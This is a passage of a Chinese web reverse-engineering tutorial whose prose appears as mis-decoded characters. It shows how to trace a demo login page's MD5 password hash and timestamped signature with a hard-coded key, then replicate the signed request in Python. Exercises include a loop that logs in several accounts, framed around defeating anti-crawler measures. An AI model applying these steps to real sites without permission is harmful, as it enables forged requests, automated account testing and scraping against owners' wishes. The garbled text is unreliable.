<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>

<span class="w">        </span><span class="c1">// å‘é€è¯·æ±‚</span>
<span class="w">        </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
<span class="w">            </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<span class="w">                </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span>
<span class="w">                </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="p">,</span>
<span class="w">                </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">,</span>
<span class="w">                </span><span class="nx">sign</span><span class="o">:</span><span class="w"> </span><span class="nx">sign</span>
<span class="w">            </span><span class="p">})</span>
<span class="w">        </span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="w">          </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p>å°†ä¸Šé¢çš„ä»£ç ä¿å­˜ä¸º <code>login_demo.html</code> å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚</p>

      <h4 id="12-è§¦å‘è¯·æ±‚">1.2 è§¦å‘è¯·æ±‚</h4>

      <ol>
        <li>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼ˆF12ï¼‰</li>
        <li>åˆ‡æ¢åˆ° <strong>Network</strong> æ ‡ç­¾</li>
        <li>ç‚¹å‡»"ç™»å½•"æŒ‰é’®</li>
        <li>è§‚å¯Ÿ Network é¢æ¿ä¸­çš„è¯·æ±‚</li>
      </ol>

      <p>ä½ ä¼šçœ‹åˆ°ä¸€ä¸ª POST è¯·æ±‚åˆ° <code>/api/login</code>ï¼ŒæŸ¥çœ‹è¯·æ±‚ä½“ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702887654321</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;sign&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;a1b2c3d4e5f6...&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å‘ç°</strong>: <code>password</code> ä¸æ˜¯æ˜æ–‡ï¼Œè€Œæ˜¯ä¸€ä¸²32ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼ˆå¾ˆå¯èƒ½æ˜¯ MD5ï¼‰</p>

      <hr />

      <h3 id="step-2-å®šä½åŠ å¯†å‡½æ•°">Step 2: å®šä½åŠ å¯†å‡½æ•°</h3>

      <h4 id="21-ä½¿ç”¨-xhr-æ–­ç‚¹">2.1 ä½¿ç”¨ XHR æ–­ç‚¹</h4>

      <ol>
        <li>åœ¨ <strong>Sources</strong> æ ‡ç­¾ä¸‹ï¼Œå³ä¾§æ‰¾åˆ° <strong>XHR/fetch Breakpoints</strong></li>
        <li>ç‚¹å‡» <code>+</code> æ·»åŠ æ–­ç‚¹</li>
        <li>è¾“å…¥ <code>/api/login</code></li>
      </ol>

      <p><img src="https://via.placeholder.com/600x300?text=XHR+Breakpoint" alt="XHR Breakpoint" /></p>

      <ol start="4">
        <li>å†æ¬¡ç‚¹å‡»"ç™»å½•"æŒ‰é’®</li>
      </ol>

      <p><strong>ç»“æœ</strong>: ä»£ç ä¼šåœ¨å‘é€è¯·æ±‚å‰æš‚åœ</p>

      <h4 id="22-æŸ¥çœ‹è°ƒç”¨æ ˆ">2.2 æŸ¥çœ‹è°ƒç”¨æ ˆ</h4>

      <p>åœ¨ <strong>Call Stack</strong> é¢æ¿ä¸­ï¼Œä½ ä¼šçœ‹åˆ°ï¼š</p>

      <pre><code>fetch (async)
login (login_demo.html:24)
onclick (login_demo.html:12)
</code></pre>

      <ol start="5">
        <li>ç‚¹å‡» <code>login</code> å‡½æ•°ï¼Œè·³è½¬åˆ°æºä»£ç </li>
      </ol>

      <p><img src="https://via.placeholder.com/600x300?text=Call+Stack" alt="Call Stack" /></p>

      <h4 id="23-è§‚å¯ŸåŠ å¯†ä»£ç ">2.3 è§‚å¯ŸåŠ å¯†ä»£ç </h4>

      <p>ç°åœ¨ä½ å¯ä»¥çœ‹åˆ°å®Œæ•´çš„åŠ å¯†é€»è¾‘ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</code></pre>
      </div>

      <p><strong>åˆ†æ</strong>:</p>

      <ul>
        <li>å¯†ç ä½¿ç”¨ <strong>MD5</strong> åŠ å¯†</li>
        <li>ç­¾åä½¿ç”¨ <code>ç”¨æˆ·å + åŠ å¯†åçš„å¯†ç  + æ—¶é—´æˆ³ + å¯†é’¥</code> æ‹¼æ¥åå† MD5</li>
        <li>å¯†é’¥æ˜¯ <code>SECRET_KEY</code></li>
      </ul>

      <hr />

      <h3 id="step-3-åœ¨-console-ä¸­éªŒè¯">Step 3: åœ¨ Console ä¸­éªŒè¯</h3>

      <h4 id="31-æµ‹è¯•åŠ å¯†å‡½æ•°">3.1 æµ‹è¯•åŠ å¯†å‡½æ•°</h4>

      <p>åœ¨ Console ä¸­æ‰§è¡Œï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æµ‹è¯• MD5</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="s1">&#39;123456&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
<span class="c1">// è¾“å‡º: &quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>
</code></pre>
      </div>

      <h4 id="32-å®Œæ•´æµ‹è¯•">3.2 å®Œæ•´æµ‹è¯•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;123456&#39;</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
<span class="w">    </span><span class="nx">encryptedPassword</span><span class="o">:</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="p">,</span>
<span class="w">    </span><span class="nx">sign</span><span class="o">:</span><span class="w"> </span><span class="nx">sign</span><span class="p">,</span>
<span class="w">    </span><span class="nx">timestamp</span><span class="o">:</span><span class="w"> </span><span class="nx">timestamp</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>è¾“å‡º</strong>:</p>

      <pre><code>{
  encryptedPassword: "e10adc3949ba59abbe56e057f20f883e",
  sign: "f7c3bc1d808e04732adf679965ccc34c",
  timestamp: 1702887654321
}
</code></pre>

      <p>âœ… <strong>éªŒè¯</strong>: æ¯æ¬¡æ‰§è¡Œï¼Œ<code>encryptedPassword</code> éƒ½æ˜¯å›ºå®šçš„ï¼Œä½† <code>sign</code> ä¼šå˜åŒ–ï¼ˆå› ä¸ºæ—¶é—´æˆ³åœ¨å˜ï¼‰</p>

      <hr />

      <h3 id="step-4-python-å¤ç°">Step 4: Python å¤ç°</h3>

      <h4 id="41-å®‰è£…ä¾èµ–">4.1 å®‰è£…ä¾èµ–</h4>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>requests
</code></pre>
      </div>

      <h4 id="42-ç¼–å†™-python-è„šæœ¬">4.2 ç¼–å†™ Python è„šæœ¬</h4>

      <p>åˆ›å»º <code>login.py</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="k">def</span><span class="w"> </span><span class="nf">md5</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;MD5 åŠ å¯†&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
    <span class="c1"># 1. åŠ å¯†å¯†ç </span>
    <span class="n">encrypted_password</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

    <span class="c1"># 2. ç”Ÿæˆæ—¶é—´æˆ³</span>
    <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>

    <span class="c1"># 3. ç”Ÿæˆç­¾å</span>
    <span class="n">sign_string</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">encrypted_password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;SECRET_KEY&#39;</span>
    <span class="n">sign</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">sign_string</span><span class="p">)</span>

    <span class="c1"># 4. æ„é€ è¯·æ±‚ä½“</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">encrypted_password</span><span class="p">,</span>
        <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
        <span class="s1">&#39;sign&#39;</span><span class="p">:</span> <span class="n">sign</span>
    <span class="p">}</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ğŸ“¤ å‘é€è¯·æ±‚:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Username: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Encrypted Password: </span><span class="si">{</span><span class="n">encrypted_password</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Timestamp: </span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Sign: </span><span class="si">{</span><span class="n">sign</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="c1"># 5. å‘é€è¯·æ±‚</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
        <span class="s1">&#39;https://example.com/api/login&#39;</span><span class="p">,</span>
        <span class="n">json</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span>
        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">}</span>
    <span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">ğŸ“¥ å“åº”:&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Status Code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  Response: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># æµ‹è¯•</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">âœ… ç™»å½•ç»“æœ: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="43-è¿è¡Œæµ‹è¯•">4.3 è¿è¡Œæµ‹è¯•</h4>

      <div class="codehilite">
        <pre><span></span><code>python<span class="w"> </span>login.py
</code></pre>
      </div>

      <p><strong>é¢„æœŸè¾“å‡º</strong>:</p>

      <pre><code>ğŸ“¤ å‘é€è¯·æ±‚:
  Username: admin
  Encrypted Password: e10adc3949ba59abbe56e057f20f883e
  Timestamp: 1702887654321
  Sign: f7c3bc1d808e04732adf679965ccc34c

ğŸ“¥ å“åº”:
  Status Code: 200
  Response: {"code":0,"message":"ç™»å½•æˆåŠŸ","data":{"token":"..."}}

âœ… ç™»å½•ç»“æœ: {'code': 0, 'message': 'ç™»å½•æˆåŠŸ', 'data': {...}}
</code></pre>

      <hr />

      <h2 id="éªŒè¯æ¸…å•">âœ… éªŒè¯æ¸…å•</h2>

      <p>å®Œæˆåï¼Œæ£€æŸ¥ä»¥ä¸‹é¡¹ç›®ï¼š</p>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æˆåŠŸæ‰¾åˆ°äº†åŠ å¯†å‡½æ•°ä½ç½®</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> è¯†åˆ«å‡ºåŠ å¯†ç®—æ³•æ˜¯ MD5</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æå–å‡ºäº†å¯†é’¥ <code>SECRET_KEY</code></li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> ç†è§£äº†ç­¾åç”Ÿæˆé€»è¾‘</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> Python è„šæœ¬èƒ½æ­£ç¡®ç”ŸæˆåŠ å¯†å‚æ•°</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> æˆåŠŸå‘é€äº†è¯·æ±‚å¹¶å¾—åˆ°å“åº”</li>
      </ul>

      <hr />

      <h2 id="è¿›é˜¶ç»ƒä¹ ">ğŸ“ è¿›é˜¶ç»ƒä¹ </h2>

      <h3 id="ç»ƒä¹ 1-åˆ†ææ›´å¤æ‚çš„åŠ å¯†">ç»ƒä¹ 1: åˆ†ææ›´å¤æ‚çš„åŠ å¯†</h3>

      <p>å°è¯•åˆ†æä½¿ç”¨ AES åŠ å¯†çš„æ¥å£ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç¤ºä¾‹ï¼šAES åŠ å¯†</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s1">&#39;1234567890abcdef&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">iv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Utf8</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="s1">&#39;abcdefghijklmnop&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">});</span>
</code></pre>
      </div>

      <p><strong>æç¤º</strong>: Python ä½¿ç”¨ <code>pycryptodome</code> åº“ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>pycryptodome
</code></pre>
      </div>

      <h3 id="ç»ƒä¹ 2-å¤„ç†åŠ¨æ€å¯†é’¥">ç»ƒä¹ 2: å¤„ç†åŠ¨æ€å¯†é’¥</h3>

      <p>æœ‰äº›ç½‘ç«™çš„å¯†é’¥æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</code></pre>
      </div>

      <p><strong>ä»»åŠ¡</strong>: ä¿®æ”¹ Python è„šæœ¬ï¼Œæ”¯æŒåŠ¨æ€å¯†é’¥</p>

      <h3 id="ç»ƒä¹ 3-æ‰¹é‡æµ‹è¯•">ç»ƒä¹ 3: æ‰¹é‡æµ‹è¯•</h3>

      <p>ç¼–å†™è„šæœ¬æµ‹è¯•å¤šä¸ªè´¦å·ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="n">users</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">(</span><span class="s1">&#39;user1&#39;</span><span class="p">,</span> <span class="s1">&#39;password1&#39;</span><span class="p">),</span>
    <span class="p">(</span><span class="s1">&#39;user2&#39;</span><span class="p">,</span> <span class="s1">&#39;password2&#39;</span><span class="p">),</span>
    <span class="p">(</span><span class="s1">&#39;user3&#39;</span><span class="p">,</span> <span class="s1">&#39;password3&#39;</span><span class="p">)</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">â— å¸¸è§é—®é¢˜</h2>

      <h3 id="q1-å¦‚ä½•åˆ¤æ–­ä½¿ç”¨äº†å“ªç§åŠ å¯†ç®—æ³•">Q1: å¦‚ä½•åˆ¤æ–­ä½¿ç”¨äº†å“ªç§åŠ å¯†ç®—æ³•ï¼Ÿ</h3>

      <p><strong>A</strong>: æ ¹æ®ç‰¹å¾è¯†åˆ«ï¼š</p>

      <table>
        <thead>
          <tr>
            <th>ç‰¹å¾</th>
            <th>å¯èƒ½çš„ç®—æ³•</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>32ä½åå…­è¿›åˆ¶</td>
            <td>MD5</td>
          </tr>
          <tr>
            <td>40ä½åå…­è¿›åˆ¶</td>
            <td>SHA1</td>
          </tr>
          <tr>
            <td>64ä½åå…­è¿›åˆ¶</td>
            <td>SHA256</td>
          </tr>
          <tr>
            <td>Base64ç¼–ç  + å›ºå®šé•¿åº¦</td>
            <td>AES/DES</td>
          </tr>
          <tr>
            <td>çœ‹åˆ° <code>CryptoJS.MD5</code></td>
            <td>ç¡®å®šæ˜¯ MD5</td>
          </tr>
        </tbody>
      </table>

      <p><strong>å·¥å…·</strong>: ä½¿ç”¨ <a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></p>

      <h3 id="q2-æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°ä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠ">Q2: æ‰¾ä¸åˆ°åŠ å¯†å‡½æ•°ï¼Ÿä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠï¼Ÿ</h3>

      <p><strong>A</strong>: ä½¿ç”¨ä»¥ä¸‹æŠ€å·§ï¼š</p>

      <ol>
        <li>æœç´¢åŠ å¯†åº“åç§°ï¼š<code>CryptoJS</code>, <code>crypto</code>, <code>encrypt</code></li>
        <li>æœç´¢ç‰¹å¾å­—ç¬¦ä¸²ï¼š<code>MD5</code>, <code>AES</code>, <code>SHA</code></li>
        <li>Hook å¯ç–‘å‡½æ•°æŸ¥çœ‹è¾“å…¥è¾“å‡º</li>
        <li>ä½¿ç”¨ <a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
      </ol>

      <h3 id="q3-python-ç”Ÿæˆçš„ç­¾åä¸å¯¹">Q3: Python ç”Ÿæˆçš„ç­¾åä¸å¯¹ï¼Ÿ</h3>

      <p><strong>A</strong>: æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p>

      <ol>
        <li><strong>å­—ç¬¦ç¼–ç </strong>: ç¡®ä¿ä½¿ç”¨ UTF-8</li>
        <li><strong>æ—¶é—´æˆ³æ ¼å¼</strong>: æ¯«ç§’è¿˜æ˜¯ç§’ï¼Ÿ</li>
        <li><strong>æ‹¼æ¥é¡ºåº</strong>: å‚æ•°é¡ºåºæ˜¯å¦æ­£ç¡®ï¼Ÿ</li>
        <li><strong>å¯†é’¥</strong>: æ˜¯å¦æœ‰éšè—çš„ç›æˆ–å¯†é’¥ï¼Ÿ</li>
      </ol>

      <p><strong>è°ƒè¯•æŠ€å·§</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åœ¨ Python ä¸­æ‰“å°ä¸­é—´å€¼</span>
<span class="n">sign_string</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">encrypted_password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;SECRET_KEY&#39;</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sign String: </span><span class="si">{</span><span class="n">sign_string</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sign: </span><span class="si">{</span><span class="n">md5</span><span class="p">(</span><span class="n">sign_string</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p>ç„¶ååœ¨æµè§ˆå™¨ä¸­å¯¹æ¯”ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">encryptedPassword</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="q4-å¦‚ä½•å¤„ç†éæ ‡å‡†çš„åŠ å¯†">Q4: å¦‚ä½•å¤„ç†éæ ‡å‡†çš„åŠ å¯†ï¼Ÿ</h3>

      <p><strong>A</strong>: æœ‰äº›ç½‘ç«™ä½¿ç”¨è‡ªå®šä¹‰åŠ å¯†ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">customEncrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// è‡ªå®šä¹‰ç®—æ³•</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>è§£å†³</strong>:</p>

      <ol>
        <li>å®Œæ•´ç†è§£ç®—æ³•é€»è¾‘</li>
        <li>ç”¨ Python é€è¡Œç¿»è¯‘</li>
        <li>æˆ–è€…è€ƒè™‘ä½¿ç”¨ <a href="#04-Advanced-Recipes-javascript-vm-protection">RPC è°ƒç”¨</a></li>
      </ol>

      <hr />

      <h2 id="åŸç†è§£æ">ğŸ” åŸç†è§£æ</h2>

      <h3 id="ä¸ºä»€ä¹ˆç½‘ç«™è¦åŠ å¯†å‚æ•°">ä¸ºä»€ä¹ˆç½‘ç«™è¦åŠ å¯†å‚æ•°ï¼Ÿ</h3>

      <ol>
        <li><strong>å®‰å…¨æ€§</strong>: é˜²æ­¢å¯†ç æ˜æ–‡ä¼ è¾“</li>
        <li><strong>é˜²ç¯¡æ”¹</strong>: ç­¾åç¡®ä¿å‚æ•°æœªè¢«ä¿®æ”¹</li>
        <li><strong>é˜²é‡æ”¾</strong>: æ—¶é—´æˆ³é˜²æ­¢é‡æ”¾æ”»å‡»</li>
        <li><strong>åçˆ¬è™«</strong>: å¢åŠ é€†å‘éš¾åº¦</li>
